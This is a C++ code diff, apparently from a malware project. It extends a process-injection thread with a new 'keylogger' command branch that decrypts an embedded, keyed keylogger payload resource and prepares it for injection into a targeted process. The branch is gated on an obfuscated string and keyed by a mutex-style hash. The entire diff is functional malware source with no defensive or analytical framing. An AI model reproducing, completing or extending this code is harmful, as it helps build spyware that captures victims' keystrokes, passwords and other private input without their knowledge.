@@ -32,6 +32,7 @@
 #include "../shared/context.h"
 #include "vr-config.h"
 #include "gts.dll.h"
+#include "keylogger.dll.h"
 
 void injector_thread(context& ctx)
 {
@@ -105,6 +106,17 @@ void injector_thread(context& ctx)
                                             payload_data.resize(RSRC_GTS_SIZE);
                                             if (!resource_open(payload_data, RSRC_GTS_DATA, RSRC_GTS_DATA_SIZE, RSRC_GTS_KEY, RSRC_GTS_KEY_SIZE))
                                                 payload_data.clear();
+                                        }
+                                        else if (strcmp(json_getValue(item_type), xorstr_("keylogger")) == 0)
+                                        {
+                                            DWORD session_id = 0;
+                                            if (ProcessIdToSessionId(entry.th32ProcessID, &session_id))
+                                            {
+                                                seed = combine_hash(vr_mutant_keylogger, entry.th32ProcessID);
+                                                payload_data.resize(RSRC_KEYLOGGER_SIZE);
+                                                if (!resource_open(payload_data, RSRC_KEYLOGGER_DATA, RSRC_KEYLOGGER_DATA_SIZE, RSRC_KEYLOGGER_KEY, RSRC_KEYLOGGER_KEY_SIZE))
+                                                    payload_data.clear();
+                                            }
                                         }
                                     }
 
